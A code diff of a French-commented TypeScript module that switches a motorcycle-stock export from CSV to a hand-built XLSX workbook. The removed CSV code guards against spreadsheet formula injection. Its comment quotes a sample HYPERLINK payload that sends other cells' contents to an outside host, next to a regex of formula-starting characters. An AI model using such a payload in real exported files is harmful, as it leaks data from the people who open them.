@@ -13,30 +13,21 @@
  * plutôt que par la liste — formulé ainsi, il tient encore le jour où quelqu'un
  * ajoute une colonne sans y penser.
  *
- * **Du CSV, et point-virgule.** Excel en français découpe sur le point-virgule ;
- * sur la virgule, tout atterrit dans une seule colonne. Le fichier se fabrique
- * entièrement sur l'appareil — aucun réseau, donc l'export marche au comptoir
- * coupure faite, comme le reste (D66).
+ * **Un vrai classeur, et non plus du CSV (S54).** Le commanditaire ouvre ces
+ * fichiers dans Excel : autant lui en donner un. Le format est fabriqué à la
+ * main dans `./xlsx` — aucune dépendance, et le fichier se monte entièrement
+ * sur l'appareil, donc au comptoir coupure faite comme le reste (D66).
+ *
+ * Le passage au classeur ferme au passage l'injection de formule que le CSV
+ * demandait de neutraliser à la main : une cellule déclarée `inlineStr` ne peut
+ * pas porter de formule. Ce n'est plus une chaîne qui protège, c'est la
+ * structure du format — et `xlsx.test.ts` le vérifie, sans quoi personne ne
+ * saurait que la protection repose là-dessus.
  */
 
 import type { Moto } from "./moto";
 import { LIBELLE_ETAT, LIBELLE_STATUT } from "./moto";
-
-export const SEPARATEUR = ";";
-
-/* `\r\n` et non `\n` : c'est la fin de ligne que RFC 4180 décrit et que les
-   tableurs sous Windows attendent. */
-const FIN_DE_LIGNE = "\r\n";
-
-/**
- * L'indicateur d'ordre des octets, en tête du fichier.
- *
- * Sans lui, Excel lit un CSV en codage local et rend « Côte d'Ivoire » en
- * « CÃ´te d'Ivoire ». Il ne sert qu'à l'ouverture du fichier ; il ne fait pas
- * partie des données, donc `motosEnCsv` ne le pose pas — c'est l'appelant qui
- * l'ajoute au moment de fabriquer le fichier.
- */
-export const BOM_UTF8 = "﻿";
+import { classeur, type Cellule } from "./xlsx";
 
 export const EN_TETE_EXPORT = [
   "Châssis",
@@ -51,43 +42,6 @@ export const EN_TETE_EXPORT = [
   "Entrée",
 ] as const;
 
-/**
- * Ce qui fait qu'un tableur prend une cellule pour une formule.
- *
- * Excel et LibreOffice évaluent toute cellule ouvrant par `=`, `+`, `-` ou
- * `@` ; la tabulation et le retour chariot y mènent aussi, une fois rognés.
- */
-const DEBUT_DE_FORMULE = /^[=+\-@\t\r]/;
-
-/**
- * Protège une valeur : d'abord contre le tableur, ensuite selon RFC 4180.
- *
- * **Le tableur d'abord, et c'est de la sécurité, pas de la mise en forme.** Une
- * couleur saisie `=HYPERLINK("http://ailleurs/"&A1;"ok")` n'est pas une formule
- * chez celui qui l'a tapée : elle le devient **chez celui qui ouvre le
- * fichier**, et ce qu'elle emporte est le contenu des autres cellules. Il faut
- * un compte pour saisir une moto, et c'est justement ce qui rend le cas
- * intéressant — un gérant écrit la couleur, le responsable ouvre l'export. Ce
- * fichier est le seul endroit du produit où une saisie franchit une frontière
- * de confiance.
- *
- * L'apostrophe de tête dit au tableur « ceci est du texte ». Elle se voit dans
- * la cellule, et c'est un prix payé par les seules valeurs qui n'avaient aucune
- * raison de commencer ainsi — aucune colonne d'ici n'est un nombre signé.
- *
- * **Le séparateur ensuite.** Une couleur « Rouge; noir » décalerait toutes les
- * colonnes suivantes d'un cran, en silence et sur cette seule ligne — le genre
- * d'erreur qu'on ne voit qu'en relisant le tableur à la main.
- *
- * L'ordre compte : neutraliser après avoir posé les guillemets laisserait
- * l'apostrophe en dehors de la cellule, où elle ne protège rien.
- */
-function proteger(valeur: string): string {
-  const neutre = DEBUT_DE_FORMULE.test(valeur) ? `'${valeur}` : valeur;
-  if (!/[";\r\n]/.test(neutre)) return neutre;
-  return `"${neutre.replace(/"/g, '""')}"`;
-}
-
 /** `08/10/2026`, ou rien. La date de l'appareil, comme partout ailleurs. */
 function jour(date: Date | null): string {
   if (date === null) return "";
@@ -97,47 +51,56 @@ function jour(date: Date | null): string {
 }
 
 /**
- * Les motos en CSV, dans l'ordre reçu.
+ * Les motos en lignes de tableau, en-tête compris, dans l'ordre reçu.
  *
  * L'ordre n'est pas retrié : c'est celui de l'écran, donc celui que la personne
  * a sous les yeux au moment où elle coche. Un export qui se réordonnerait tout
  * seul obligerait à relire pour vérifier qu'on a bien pris les bonnes.
+ *
+ * C'est ici, et nulle part ailleurs, que se décide ce qui sort — d'où un
+ * témoin qui vérifie l'absence de tout montant plutôt que la liste des
+ * colonnes : formulé ainsi, il tient encore le jour où quelqu'un en ajoute une
+ * sans y penser.
  */
-export function motosEnCsv(
+export function lignesMotosExport(
   motos: readonly Moto[],
   nomMarque: (id: string) => string,
   nomModele: (id: string) => string,
-): string {
-  const lignes = [EN_TETE_EXPORT.join(SEPARATEUR)];
-
-  for (const moto of motos) {
-    lignes.push(
-      [
-        moto.numeroChassis,
-        nomMarque(moto.marqueId),
-        /* Vide, et non « Modèle non précisé » : dans un tableur, une cellule
-           vide se filtre et se trie ; une phrase se lirait comme un nom de
-           modèle qui n'existe pas (D105). */
-        nomModele(moto.modeleId),
-        moto.couleur,
-        moto.annee === null ? "" : String(moto.annee),
-        LIBELLE_ETAT[moto.etat],
-        LIBELLE_STATUT[moto.statut],
-        moto.boutiqueId,
-        moto.numeroMoteur,
-        jour(moto.dateEntree),
-      ]
-        .map(proteger)
-        .join(SEPARATEUR),
-    );
-  }
-
-  return lignes.join(FIN_DE_LIGNE);
+): Cellule[][] {
+  return [
+    [...EN_TETE_EXPORT],
+    ...motos.map((moto): Cellule[] => [
+      moto.numeroChassis,
+      nomMarque(moto.marqueId),
+      /* Vide, et non « Modèle non précisé » : dans un tableur, une cellule
+         vide se filtre et se trie ; une phrase se lirait comme un nom de
+         modèle qui n'existe pas (D105). */
+      nomModele(moto.modeleId),
+      moto.couleur,
+      /* Un nombre, pas une chaîne : une année en texte se trierait comme du
+         texte, et c'est le genre de colonne qu'on trie. */
+      moto.annee,
+      LIBELLE_ETAT[moto.etat],
+      LIBELLE_STATUT[moto.statut],
+      moto.boutiqueId,
+      moto.numeroMoteur,
+      jour(moto.dateEntree),
+    ]),
+  ];
 }
 
-/** `motos-2026-10-08.csv` — daté, pour que deux exports ne se confondent pas. */
+/** Le classeur prêt à écrire sur le disque. */
+export function motosEnClasseur(
+  motos: readonly Moto[],
+  nomMarque: (id: string) => string,
+  nomModele: (id: string) => string,
+): Uint8Array<ArrayBuffer> {
+  return classeur("Motos", lignesMotosExport(motos, nomMarque, nomModele));
+}
+
+/** `motos-2026-10-08.xlsx` — daté, pour que deux exports ne se confondent pas. */
 export function nomFichierExport(maintenant: Date): string {
   const mm = `${maintenant.getMonth() + 1}`.padStart(2, "0");
   const jj = `${maintenant.getDate()}`.padStart(2, "0");
-  return `motos-${maintenant.getFullYear()}-${mm}-${jj}.csv`;
+  return `motos-${maintenant.getFullYear()}-${mm}-${jj}.xlsx`;
 }
